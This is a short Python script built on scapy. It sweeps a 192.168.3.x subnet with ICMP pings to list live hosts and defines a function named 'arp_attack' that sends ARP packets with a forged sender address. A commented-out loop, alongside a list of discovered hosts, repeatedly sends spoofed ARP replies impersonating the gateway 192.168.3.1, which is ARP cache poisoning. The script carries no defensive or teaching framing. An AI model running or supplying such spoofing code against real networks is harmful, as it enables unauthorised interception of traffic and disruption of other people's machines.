from scapy.all import *
from scapy.layers.inet import traceroute, IP, ICMP
from scapy.layers.l2 import ARP, Ether, arping

from PIL import Image

from multiprocessing.dummy import Pool as ThreadPool


def ping(target: str, timeout=1):
    icmp_str = IP(dst=target) / ICMP()
    return sr1(icmp_str, timeout=timeout)


def who_online(base_ip: str) -> list:
    online_list = []
    for i in range(1, 255):
        ip_str = "{}.{}".format(base_ip, i)
        if ping(ip_str):
            online_list.append(ip_str)
    return online_list


def arp_attack(ip):
    packet = (Ether() / ARP(pdst=ip, hwdst="20:88:10:62:2D:BA",
                            psrc="192.168.3.81", hwsrc="20:88:10:62:2D:BA"))
    ans, unans = srp(packet, timeout=2)
    ans.summary(lambda s, r: r.sprintf("%Ether.src% %ARP.psrc%"))


if __name__ == "__main__":
    # sniff(prn=lambda x:x.show())
    # construct a request arp packet
    # packet = (Ether()/ARP(pdst="192.168.2.1"))
    # ans,unans=srp(packet,timeout=2)
    # ans.summary(lambda s,r:r.sprintf("%Ether.src% %ARP.psrc%"))
    # ips = ['192.168.3.51', '192.168.3.52', '192.168.3.53', '192.168.3.57', '192.168.3.58', '192.168.3.63', '192.168.3.64', '192.168.3.67', '192.168.3.68', '192.168.3.69', '192.168.3.72', '192.168.3.74', '192.168.3.75', '192.168.3.76', '192.168.3.78', '192.168.3.79', '192.168.3.80', '192.168.3.82', '192.168.3.83', '192.168.3.84', '192.168.3.85', '192.168.3.86', '192.168.3.88', '192.168.3.89', '192.168.3.94', '192.168.3.98', '192.168.3.100', '192.168.3.102', '192.168.3.114', '192.168.3.115', '192.168.3.154', '192.168.3.192', '192.168.3.254']
    # ips = who_online("192.168.3")
    # print(ips)
    # while True:
    #     for ip in ips:
    #         packet = Ether() / ARP(pdst=ip, psrc="192.168.3.1", hwsrc="20:88:10:62:2D:BA")
    #         sendp(packet)
    ip_list = who_online("192.168.3")
